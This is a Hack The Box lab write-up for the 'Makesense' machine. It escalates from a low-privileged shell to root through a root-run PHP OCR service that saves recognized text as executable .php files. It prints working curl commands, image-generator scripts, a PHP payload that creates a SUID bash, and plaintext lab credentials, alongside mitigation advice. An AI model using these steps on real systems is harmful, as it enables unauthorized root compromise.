# HTB Makesense Writeup

> **Platform:** Hack The Box  
> **Machine:** Makesense  
> **Difficulty:** Not specified in supplied notes  
> **Author:** Muhammad Iqbal Latif  
> **Status:** Solved  
> **Flags:** Redacted intentionally  

---

## Table of Contents

- [Overview](#overview)
- [Attack Chain Summary](#attack-chain-summary)
- [Environment Used](#environment-used)
- [Starting Point and Assumptions](#starting-point-and-assumptions)
- [Phase 1, User Shell and Credential Reuse](#phase-1-user-shell-and-credential-reuse)
- [Phase 2, Discovering the Internal OCR Service](#phase-2-discovering-the-internal-ocr-service)
- [Phase 3, SSH Local Port Forwarding](#phase-3-ssh-local-port-forwarding)
- [Phase 4, Understanding the OCR Save Flow](#phase-4-understanding-the-ocr-save-flow)
- [Phase 5, Confirming PHP Execution](#phase-5-confirming-php-execution)
- [Phase 6, Privilege Escalation to Root](#phase-6-privilege-escalation-to-root)
- [Troubleshooting Notes](#troubleshooting-notes)
- [Key Concepts Explained](#key-concepts-explained)
- [Mistakes and Fixes](#mistakes-and-fixes)
- [Mitigation Recommendations](#mitigation-recommendations)
- [Final Root Path](#final-root-path)
- [Appendix, Command Reference](#appendix-command-reference)

---

## Overview

This machine’s core privilege escalation path was based on a **root-owned internal PHP OCR service** running on localhost.

The important discovery was that the target was running a PHP development server as `root`:

```bash
php -S 127.0.0.1:8001 -t /root/ocr4/
```

The OCR application allowed authenticated users to submit an image, have the text recognized, and then save the recognized output into the web-accessible `/saved/` directory.

By saving valid PHP code as a `.php` file and then requesting it through the web server, we achieved **PHP code execution inside a root-owned PHP service**. From there, we copied `/bin/bash` to `/tmp/rb`, set the SUID bit, and used `bash -p` to obtain an effective root shell.

No flag values are included in this writeup.

---

## Attack Chain Summary

```text
Existing www-data shell
        |
        v
Credentials identified for walter
        |
        v
SSH login as walter
        |
        v
User flag obtained
        |
        v
Process enumeration
        |
        v
Found root-owned PHP OCR service on 127.0.0.1:8001
        |
        v
SSH local port forward from attacker machine
        |
        v
Interact with OCR app through http://127.0.0.1:18001
        |
        v
Confirm OCR can save text as files under /saved/
        |
        v
Save tiny PHP test file
        |
        v
Confirm saved .php files execute
        |
        v
Save PHP payload using copy() and chmod()
        |
        v
Create SUID root bash at /tmp/rb
        |
        v
Run /tmp/rb -p
        |
        v
Root shell
```

---

## Environment Used

### Attacker Machine

```text
Host: Anubis
User: beluga
VPN interface: tun0
VPN IP: 10.10.15.65
```

Confirmed with:

```bash
ip -4 addr show tun0
```

Output:

```text
inet 10.10.15.65/23 brd 10.10.15.255 scope global tun0
```

### Target Machine

```text
Target IP: 10.129.40.14
Hostname: makesense
```

> [!NOTE]
> HTB target IPs can change when the machine is reset. Replace `10.129.40.14` with the active machine IP if needed.

---

## Starting Point and Assumptions

This writeup starts from the point where a shell was already available as `www-data`:

```bash
www-data@makesense:/var/www/html$
```

Earlier initial access steps are not fully visible in the supplied terminal evidence, so this writeup focuses on the confirmed path from the existing low-privileged shell to `walter`, then from `walter` to root.

The major confirmed artifacts from the supplied work were:

- A working shell as `www-data`.
- Access to an internal OCR service on `127.0.0.1:8001`.
- Credentials for the `walter` account.
- A root-owned PHP OCR service.
- Successful PHP execution through files saved by the OCR application.
- Successful creation of a SUID root bash.

---

## Phase 1, User Shell and Credential Reuse

A credential pair was available:

```text
Username: walter
Password: JbhHDAEgXvri3!
```

At first, the credential was treated as Basic Auth for the OCR web app. Later, it was clarified that it was also valid for SSH.

From the attacker machine:

```bash
ssh walter@10.129.40.14
```

Password:

```text
JbhHDAEgXvri3!
```

After logging in as `walter`, the user flag was obtained.

```bash
whoami
id
hostname
ls -la ~
```

> [!IMPORTANT]
> The user flag value is intentionally omitted.

### Screenshot Placeholder, User Access

```text
[ Screenshot Placeholder ]
Show successful SSH login as walter and user context using whoami/id.
Do not show the flag value.
```

---

## Phase 2, Discovering the Internal OCR Service

After obtaining the `walter` shell, process enumeration revealed the important privilege escalation clue:

```bash
ps auxww | grep -E '8001|ocr|php' | grep -v grep
```

Observed output:

```text
root        1397  0.0  0.0   2800  1812 ?        Ss   Jul05   0:00 /bin/sh -c /root/.scripts/start_ocr4.sh
root        1398  0.0  0.0   7340  3624 ?        S    Jul05   0:15 /bin/bash /root/.scripts/start_ocr4.sh
root        1403  0.0  0.7 228488 30596 ?        S    Jul05   0:01 php -S 127.0.0.1:8001 -t /root/ocr4/
```

This showed three important facts:

1. The OCR service was running on localhost only.
2. It used PHP’s built-in development server.
3. It was running as `root` with document root `/root/ocr4/`.

That changed the whole privilege escalation direction. If files under the OCR web root could be controlled and executed as PHP, the code would run with root privileges.

### Why This Is Dangerous

Running this as root is unsafe:

```bash
php -S 127.0.0.1:8001 -t /root/ocr4/
```

A PHP web server running as root means any PHP code execution vulnerability inside that application becomes root code execution.

### Screenshot Placeholder, Root-Owned OCR Process

```text
[ Screenshot Placeholder ]
Show ps auxww output proving php -S is running as root on 127.0.0.1:8001.
```

---

## Phase 3, SSH Local Port Forwarding

The OCR app listened only on the target’s localhost:

```text
127.0.0.1:8001
```

That means it was not directly reachable from the attacker browser. To access it cleanly, SSH local port forwarding was used.

### Incorrect Attempt

This command was accidentally run from inside the target shell:

```bash
ssh -N -L 8001:localhost:8001 walter@10.129.40.14
```

It failed with:

```text
channel_setup_fwd_listener_tcpip: cannot listen to port: 8001
Could not request local forwarding.
```

Reason:

- The command was executed from the target machine.
- Port `8001` was already occupied on the target by the OCR service.
- SSH tunnels should be created from the attacker machine, not from the target shell.

### Correct Tunnel

From the attacker machine:

```bash
ssh -N -L 18001:127.0.0.1:8001 walter@10.129.40.14
```

This maps:

```text
Attacker 127.0.0.1:18001 -> Target 127.0.0.1:8001
```

The tunnel was verified with:

```bash
curl -I -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:18001/
```

Observed response:

```text
HTTP/1.1 200 OK
X-Powered-By: PHP/8.3.6
Set-Cookie: PHPSESSID=...
Content-type: text/html; charset=UTF-8
```

This confirmed that the local tunnel was working.

### Browser URL

After the tunnel was open, the OCR app could be accessed at:

```text
http://127.0.0.1:18001/
```

### Screenshot Placeholder, SSH Tunnel

```text
[ Screenshot Placeholder ]
Show successful curl -I response from http://127.0.0.1:18001/.
```

---

## Phase 4, Understanding the OCR Save Flow

The OCR application worked like this:

```text
1. Submit a canvas image.
2. OCR recognizes text from the image.
3. Application returns a hidden ocr_id.
4. Submit ocr_id and filename.
5. Application saves recognized text under /saved/<filename>.
```

A normal text save had already been proven earlier.

Example save confirmation:

```html
<p class="notice success reveal">Saved as: saved/hello.txt</p>
```

Reading it returned:

```bash
curl -s -u 'walter:JbhHDAEgXvri3!' 'http://127.0.0.1:8001/saved/hello.txt'
```

Output:

```text
hello
```

This proved that the application could save recognized OCR output into a web-accessible location.

### Important Detail

When we tried to find the `saved/` directory from `www-data`, nothing appeared:

```bash
find / -type d -name saved -ls 2>/dev/null
find / -type f \( -name 'hello.txt' -o -name 'makeroot.php' \) -ls 2>/dev/null
```

That was expected because the actual document root was:

```text
/root/ocr4/
```

A low-privileged user cannot freely inspect `/root/ocr4/`.

---

## Phase 5, Confirming PHP Execution

Before attempting privilege escalation, we needed to prove that saved `.php` files actually executed as PHP.

This test payload was created as an image:

```php
<?php echo "PHP_OK";?>
```

The image was generated locally using Python and Pillow.

### PHP Test Image Generator

```python
from PIL import Image, ImageDraw, ImageFont

payload = '<?php echo "PHP_OK";?>'

img = Image.new("RGB", (1200, 220), "white")
draw = ImageDraw.Draw(img)

try:
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 52)
except:
    font = ImageFont.load_default()

draw.text((30, 75), payload, fill="black", font=font)
img.save("phpok.png")
print("[+] Saved phpok.png")
```

Run it:

```bash
python3 make_phpok_image.py
```

Convert the PNG to a data URL:

```bash
{ printf 'data:image/png;base64,'; base64 -w0 phpok.png; } > phpok_dataurl.txt
```

Start a clean OCR session:

```bash
curl -s -c ocr.cookies -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:18001/ -o ocr_start.html
```

Submit the image:

```bash
curl -s -b ocr.cookies -c ocr.cookies \
  -u 'walter:JbhHDAEgXvri3!' \
  -X POST 'http://127.0.0.1:18001/' \
  --data-urlencode "canvas_image@phpok_dataurl.txt" \
  -o phpok_result.html
```

Check recognized text:

```bash
grep -A10 -n 'Recognized' phpok_result.html
```

Observed recognized text:

```html
<p class="output-text">&lt;?php echo &quot;PHP OK&quot;; ?&gt;</p>
```

The OCR changed `PHP_OK` into `PHP OK`, but the PHP syntax was still valid.

Extract the OCR ID:

```bash
OCR_ID=$(grep -oP 'name="ocr_id" value="\K[^"]+' phpok_result.html); echo "$OCR_ID"
```

Save it as `test.php`:

```bash
curl -s -b ocr.cookies -c ocr.cookies \
  -u 'walter:JbhHDAEgXvri3!' \
  -X POST 'http://127.0.0.1:18001/' \
  -d "ocr_id=$OCR_ID&filename=test.php&save_output=Save" \
  -o phpok_save.html
```

Confirm save:

```bash
grep -nEi 'saved|success|error|invalid|test.php|notice' phpok_save.html
```

Trigger it:

```bash
curl -s -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:18001/saved/test.php; echo
```

Observed result:

```text
PHP OK
```

This confirmed that saved `.php` files executed as PHP.

### Why This Was the Critical Check

Without this check, the exploit would still be guesswork.

This proved:

```text
OCR output -> saved as .php -> requested through /saved/ -> executed by PHP server
```

Because the PHP server was running as root, the next payload would execute with root privileges.

### Screenshot Placeholder, PHP Execution Test

```text
[ Screenshot Placeholder ]
Show recognized PHP test payload, successful save as test.php, and output PHP OK.
```

---

## Phase 6, Privilege Escalation to Root

The first attempted payload used `system()`:

```php
<?php system("cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb"); ?>
```

It was saved as:

```text
saved/makeroot.php
```

The request returned:

```text
HTTP=200 SIZE=0
```

But `/tmp/rb` was not created.

Instead of relying on shell command execution through `system()`, the final working payload used PHP built-in functions:

```php
<?php echo copy("/bin/bash","/tmp/rb")?"C":"F";echo chmod("/tmp/rb",2541)?"M":"N";?>
```

### Why This Payload Is Better

```php
copy("/bin/bash","/tmp/rb")
```

Copies `/bin/bash` directly using PHP.

```php
chmod("/tmp/rb",2541)
```

Sets the permission bits directly using PHP.

The number `2541` is the decimal form of octal `04755`.

```text
04755 = SUID + rwxr-xr-x
```

The payload prints status letters:

```text
C = copy succeeded
F = copy failed
M = chmod succeeded
N = chmod failed
```

So the desired output was:

```text
CM
```

### Root Payload Image Generator

On the attacker machine:

```python
from PIL import Image, ImageDraw, ImageFont

payload = '<?php echo copy("/bin/bash","/tmp/rb")?"C":"F";echo chmod("/tmp/rb",2541)?"M":"N";?>'

img = Image.new("RGB", (3000, 260), "white")
draw = ImageDraw.Draw(img)

try:
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 44)
except:
    font = ImageFont.load_default()

draw.text((25, 90), payload, fill="black", font=font)
img.save("root_payload.png")
print("[+] Saved root_payload.png")
```

Run it:

```bash
python3 make_root_payload_image.py
```

Convert to data URL:

```bash
{ printf 'data:image/png;base64,'; base64 -w0 root_payload.png; } > root_payload_dataurl.txt
```

Submit it to OCR:

```bash
curl -s -b ocr.cookies -c ocr.cookies \
  -u 'walter:JbhHDAEgXvri3!' \
  -X POST 'http://127.0.0.1:18001/' \
  --data-urlencode "canvas_image@root_payload_dataurl.txt" \
  -o root_payload_result.html
```

Check OCR recognition:

```bash
grep -A10 -n 'Recognized' root_payload_result.html
```

Observed recognized output:

```html
<p class="output-text">&lt;?php echo copy(&quot;/bin/bash&quot;,&quot;/tmp/rb&quot;)?&quot;C&quot;:&quot;F&quot;;echo chmod(&quot;/tmp/rb&quot;, 2541) ?&quot;M&quot;:&quot;N&quot;; ?&gt;</p>
```

The OCR added some spaces, but the PHP syntax remained valid.

Extract the OCR ID:

```bash
ROOT_OCR_ID=$(grep -oP 'name="ocr_id" value="\K[^"]+' root_payload_result.html); echo "$ROOT_OCR_ID"
```

Save it as `x.php`:

```bash
curl -s -b ocr.cookies -c ocr.cookies \
  -u 'walter:JbhHDAEgXvri3!' \
  -X POST 'http://127.0.0.1:18001/' \
  -d "ocr_id=$ROOT_OCR_ID&filename=x.php&save_output=Save" \
  -o root_payload_save.html
```

Confirm save:

```bash
grep -nEi 'saved|success|error|invalid|x.php|notice' root_payload_save.html
```

Observed:

```html
<p class="notice success reveal">Saved as: saved/x.php</p>
```

Trigger the payload:

```bash
curl -s -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:18001/saved/x.php; echo
```

Observed:

```text
CM
```

This confirmed that `/bin/bash` was copied and chmod was applied.

Back in the `walter` SSH shell:

```bash
ls -la /tmp/rb
```

Observed:

```text
-rwsr-xr-x 1 root root 1446024 Jul  6 00:51 /tmp/rb
```

This is a root-owned SUID bash.

Run it with privilege preservation:

```bash
/tmp/rb -p
```

Check identity:

```bash
id
```

Observed:

```text
uid=1000(walter) gid=1000(walter) euid=0(root) groups=1000(walter)
```

The effective user ID was root, so the shell had root privileges.

Finally, the root flag was read:

```bash
cat /root/root.txt
```

> [!IMPORTANT]
> The root flag value is intentionally omitted.

### Screenshot Placeholder, Root Escalation

```text
[ Screenshot Placeholder ]
Show curl returning CM, ls -la /tmp/rb showing root-owned SUID bash, /tmp/rb -p, and id showing euid=0(root).
Do not show the root flag value.
```

---

## Troubleshooting Notes

### Problem 1, Pasted Commands Got Jumbled

Some multi-line commands were pasted together with terminal prompts and previous output. This caused errors such as:

```text
bash: www-data@makesense:/var/www/html$: No such file or directory
bash: syntax error near unexpected token `newline'
```

Fix:

- Paste only the command, not the prompt.
- Avoid copying command output back into the terminal.
- Use one command at a time when testing fragile steps.

Bad paste:

```text
www-data@makesense:/var/www/html$ curl ...
HTTP/1.1 200 OK
```

Good paste:

```bash
curl ...
```

---

### Problem 2, Running the SSH Tunnel From the Wrong Place

The SSH tunnel was accidentally run from the target shell:

```text
walter@makesense:~$
```

That failed because the target already had port `8001` in use.

Correct approach:

Run the tunnel from the attacker machine:

```text
beluga@Anubis
```

Correct command:

```bash
ssh -N -L 18001:127.0.0.1:8001 walter@10.129.40.14
```

---

### Problem 3, Old `system()` Payload Failed

The old payload returned no useful output and did not create `/tmp/rb`:

```php
<?php system("cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb"); ?>
```

The replacement payload avoided shell execution and used PHP directly:

```php
<?php echo copy("/bin/bash","/tmp/rb")?"C":"F";echo chmod("/tmp/rb",2541)?"M":"N";?>
```

This also provided visible feedback through `CM`.

---

### Problem 4, OCR Changed Characters

OCR changed:

```php
<?php echo "PHP_OK";?>
```

into:

```php
<?php echo "PHP OK"; ?>
```

This was acceptable because the PHP remained syntactically valid.

For the final payload, OCR also added spaces around `2541` and `?`, but PHP still parsed it correctly.

Lesson:

> Always inspect the recognized text before saving it as `.php`.

---

## Key Concepts Explained

### 1. Localhost-Only Services

A service bound to `127.0.0.1` only accepts connections from the same machine.

Example:

```text
127.0.0.1:8001
```

From the attacker machine, this is not directly reachable. But after SSH access, port forwarding can expose it locally.

---

### 2. SSH Local Port Forwarding

Command used:

```bash
ssh -N -L 18001:127.0.0.1:8001 walter@10.129.40.14
```

Meaning:

```text
Your machine: 127.0.0.1:18001
        forwards to
Target machine: 127.0.0.1:8001
```

The `-N` flag means:

```text
Do not open a shell, only create the tunnel.
```

That is why the terminal appears blank after authentication.

---

### 3. PHP Built-In Development Server

The target used:

```bash
php -S 127.0.0.1:8001 -t /root/ocr4/
```

This starts a PHP server:

- `127.0.0.1:8001`, listen address and port.
- `-t /root/ocr4/`, document root.

If this process runs as root, PHP files are executed with root privileges.

---

### 4. SUID Bit

The final payload created:

```text
/tmp/rb
```

with permissions:

```text
-rwsr-xr-x
```

The `s` in the owner execute position means the SUID bit is set.

For a root-owned binary, SUID means:

```text
When executed, the program runs with effective UID of root.
```

---

### 5. Why `/tmp/rb -p` Was Needed

Normal bash may drop elevated privileges for safety. The `-p` option tells bash to preserve the effective UID.

Command:

```bash
/tmp/rb -p
```

Result:

```text
euid=0(root)
```

Without `-p`, bash may not preserve root privileges.

---

### 6. Decimal `2541` Versus Octal `04755`

The SUID permission mode needed was:

```text
04755
```

PHP code used:

```php
chmod("/tmp/rb",2541)
```

Why?

```text
04755 octal = 2541 decimal
```

So the integer `2541` represents the same permission bitmask.

---

## Mistakes and Fixes

| Mistake | What Happened | Fix |
|---|---|---|
| Treated SSH credential only as web auth | Delayed the user pivot | Used SSH as `walter` |
| Ran SSH tunnel from target | Port binding failed | Ran tunnel from attacker machine |
| Used local port `8001` | Could conflict with existing services | Used local port `18001` |
| Trusted OCR output blindly | OCR corrupted special characters | Inspected recognized text before saving |
| Used shell-based `system()` payload | Payload gave no useful result | Used PHP `copy()` and `chmod()` |
| Typed `cat/root/root.txt` | Shell treated it as one command | Correct command was `cat /root/root.txt` |

---

## Mitigation Recommendations

If this were a real environment, the following fixes would be necessary.

### 1. Do Not Run Web Services as Root

The OCR PHP server should not run as root.

Use a dedicated low-privileged user:

```text
ocrapp
www-data
appuser
```

---

### 2. Do Not Use PHP’s Built-In Server in Production

PHP’s built-in server is intended for development and testing, not production.

Use a properly configured web server such as:

```text
nginx + php-fpm
Apache + php-fpm
```

---

### 3. Prevent Executable Uploads

The application should not allow user-controlled content to be saved as executable `.php` files.

Recommended controls:

- Force safe extensions such as `.txt`.
- Strip dangerous extensions.
- Store files outside the web root.
- Serve saved files as plain text only.
- Disable script execution inside upload/save directories.

---

### 4. Validate and Sanitize Filenames

The save feature should validate filenames strictly.

Allowlist example:

```text
letters, numbers, dash, underscore, .txt only
```

Reject:

```text
.php
.phtml
.phar
../
absolute paths
null bytes
```

---

### 5. Separate Application Logic From User-Controlled Storage

User-generated OCR output should be stored in a non-executable location:

```text
/var/lib/ocr-output/
```

not inside:

```text
/root/ocr4/saved/
```

---

### 6. Principle of Least Privilege

The OCR service only needed to process and save text. It did not need root access.

Root-owned execution made a minor file-save issue become full system compromise.

---

## Final Root Path

```text
1. SSH as walter.
2. Enumerate processes.
3. Find root-owned PHP OCR service on 127.0.0.1:8001.
4. Create SSH tunnel from attacker machine.
5. Access OCR app through http://127.0.0.1:18001.
6. Confirm OCR saves files into web-accessible /saved/ directory.
7. Confirm saved .php files execute.
8. Save PHP payload that copies /bin/bash to /tmp/rb and chmods it SUID.
9. Trigger payload and receive CM.
10. Run /tmp/rb -p.
11. Confirm euid=0(root).
12. Read root flag, value redacted.
```

---

## Appendix, Command Reference

### SSH as Walter

```bash
ssh walter@10.129.40.14
```

### Process Enumeration

```bash
ps auxww | grep -E '8001|ocr|php' | grep -v grep
```

### SSH Tunnel

```bash
ssh -N -L 18001:127.0.0.1:8001 walter@10.129.40.14
```

### Tunnel Test

```bash
curl -I -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:18001/
```

### Generate PHP Test Image

```bash
python3 make_phpok_image.py
```

### Convert Image to Data URL

```bash
{ printf 'data:image/png;base64,'; base64 -w0 phpok.png; } > phpok_dataurl.txt
```

### Start OCR Session

```bash
curl -s -c ocr.cookies -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:18001/ -o ocr_start.html
```

### Submit Image to OCR

```bash
curl -s -b ocr.cookies -c ocr.cookies \
  -u 'walter:JbhHDAEgXvri3!' \
  -X POST 'http://127.0.0.1:18001/' \
  --data-urlencode "canvas_image@phpok_dataurl.txt" \
  -o phpok_result.html
```

### Extract OCR ID

```bash
OCR_ID=$(grep -oP 'name="ocr_id" value="\K[^"]+' phpok_result.html); echo "$OCR_ID"
```

### Save OCR Output as PHP

```bash
curl -s -b ocr.cookies -c ocr.cookies \
  -u 'walter:JbhHDAEgXvri3!' \
  -X POST 'http://127.0.0.1:18001/' \
  -d "ocr_id=$OCR_ID&filename=test.php&save_output=Save" \
  -o phpok_save.html
```

### Trigger Saved PHP

```bash
curl -s -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:18001/saved/test.php; echo
```

### Trigger Root Payload

```bash
curl -s -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:18001/saved/x.php; echo
```

### Check SUID Bash

```bash
ls -la /tmp/rb
```

### Get Effective Root Shell

```bash
/tmp/rb -p
id
```

### Read Root Flag

```bash
cat /root/root.txt
```

Flag value intentionally omitted.

---

## Closing Notes

The key lesson from this machine is that the most dangerous issue was not only the OCR feature. The real vulnerability chain was:

```text
User-controlled saved file + executable web directory + PHP execution + root-owned service
```

Each individual mistake may look small, but together they created a direct path to root.

The clean exploitation mindset was:

```text
Confirm save works -> confirm PHP executes -> confirm service runs as root -> execute minimal root payload -> verify with permissions -> use bash -p
```

That is the approach to remember for similar HTB machines.
